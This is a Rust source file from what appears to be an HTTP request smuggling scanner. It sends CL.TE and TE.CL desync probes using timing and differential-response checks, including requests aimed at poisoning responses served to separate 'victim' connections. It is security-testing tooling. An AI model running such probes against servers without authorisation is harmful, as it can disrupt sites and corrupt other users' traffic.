use crate::{
    structs::{Config, Connection, AttackType},
    utils::{generate_requests, payloads, found},
    raw_requests::{make_connection, raw_request},
};
use std::{thread, time, io, io::Write};

pub fn timing(
    config: &Config,
    mut stream: Connection
) {
    let request_template = generate_requests(AttackType::ClTe, config);

    for attack_type in [AttackType::ClTeTime, AttackType::TeClTime].iter() {
        let bad_request_template = generate_requests(*attack_type, config);

        for payload in payloads(config) {
            //generate a request that will cause time delay in case of presence of the vulnerability
            let bad_request = bad_request_template.replace("Transfer-Encoding: chunked", &payload);
            //send this request and get the response
            let (new_stream, bad_response) = match raw_request(config, stream, &bad_request) {
                Ok(val) => val,
                Err(err) => {
                    writeln!(io::stderr(), "{}", err).ok();
                    stream = make_connection(&config).unwrap();
                    continue
                }
            };
            //reconnect to the server in case of closed connection
            stream = if bad_response.is_closed() { make_connection(&config).unwrap() } else { new_stream.unwrap_or(make_connection(&config).unwrap()) };

            //observe the time delay
            if bad_response.time > 5000 {
                stream.shutdown().ok();
                thread::sleep(time::Duration::from_secs(5));
                //generate a request that will look like the first request, but should not cause a time delay
                let request = request_template.replace("Transfer-Encoding: chunked", &payload);
                let (new_stream, response) = match raw_request(config, make_connection(&config).unwrap(), &request) {
                    Ok(val) => val,
                    Err(err) => {
                        writeln!(io::stderr(), "{}", err).ok();
                        continue
                    }
                };
                //close the connection
                if let Some(mut stream) = new_stream { stream.shutdown().ok(); }

                //the delay of the bad response is much longer.
                if response.time * 5 < bad_response.time {
                    stream.shutdown().ok();
                    found(*attack_type, &bad_request, &request, &bad_response, &response);
                    std::process::exit(0);
                }
            }
        }
    }
    stream.shutdown().ok();
}

pub fn differential_responses(
    config: &Config,
    stream: Connection,
) {
    //create different requests
    let mut usual_request = config.custom_print("GET", &config.path);
    usual_request.push_str("\r\n");

    let mut gmethod_request = config.custom_print("GPOST", &config.path);
    gmethod_request.push_str("\r\n");

    let mut notfound_request = config.custom_print("GET", "/so404mething");
    notfound_request.push_str("\r\n");

    //send these requests to check whether the clear difference (comparing to usual response) is present
    let (stream, usual_response) = raw_request(config, stream, &usual_request).unwrap();
    let stream = if usual_response.is_closed() { make_connection(&config).unwrap() } else { stream.unwrap_or(make_connection(&config).unwrap()) };

    let (stream, gmethod_response) = raw_request(config, stream, &gmethod_request).unwrap();
    let stream = if gmethod_response.is_closed() { make_connection(&config).unwrap() } else { stream.unwrap_or(make_connection(&config).unwrap()) };

    let (stream, notfound_response) = raw_request(config, stream, &notfound_request).unwrap();
    let mut stream = if notfound_response.is_closed() { make_connection(&config).unwrap() } else { stream.unwrap_or(make_connection(&config).unwrap()) };


    if usual_response.code != gmethod_response.code || gmethod_response.body.contains("GPOST") {
        for attack_type in [AttackType::ClTeMethod, AttackType::TeClMethod].iter() {
            let attacker_request_template = generate_requests(*attack_type, config);

            for payload in payloads(config) {
                let attacker_request = attacker_request_template.replace("Transfer-Encoding: chunked", payload);

                //make a request that may cause response desync
                let (new_stream, attacker_response) = raw_request(config, stream, &attacker_request).unwrap();
                stream = if attacker_response.is_closed() { make_connection(&config).unwrap() } else { new_stream.unwrap_or(make_connection(&config).unwrap()) };

                //try to catch that desync
                for _ in 0..3 {
                    let (_, victim_response) = raw_request(config, make_connection(&config).unwrap(), &usual_request).unwrap();
                    if victim_response.body.contains("GGET") || victim_response.code == gmethod_response.code {
                        found(*attack_type, &attacker_request, &usual_request, &victim_response, &usual_response);
                        std::process::exit(0);
                    }
                }
            }
        }
    } else if usual_response.code != notfound_response.code || notfound_response.body.contains("so404mething") {
        for attack_type in [AttackType::ClTeNotfound, AttackType::TeClNotfound].iter() {
            let attacker_request_template = generate_requests(*attack_type, config);

            for payload in payloads(config) {
                let attacker_request = attacker_request_template.replace("Transfer-Encoding: chunked", payload);

                let (new_stream, attacker_response) = raw_request(config, stream, &attacker_request).unwrap();
                stream = if attacker_response.is_closed() { make_connection(&config).unwrap() } else { new_stream.unwrap_or(make_connection(&config).unwrap()) };

                for _ in 0..3 {
                    let (_, victim_response) = raw_request(config, make_connection(&config).unwrap(), &usual_request).unwrap();
                    if victim_response.body.contains("so404mething") || victim_response.code == notfound_response.code {
                        found(*attack_type, &attacker_request, &usual_request, &victim_response, &usual_response);
                        std::process::exit(0);
                    }
                }
            }
        }
    }
}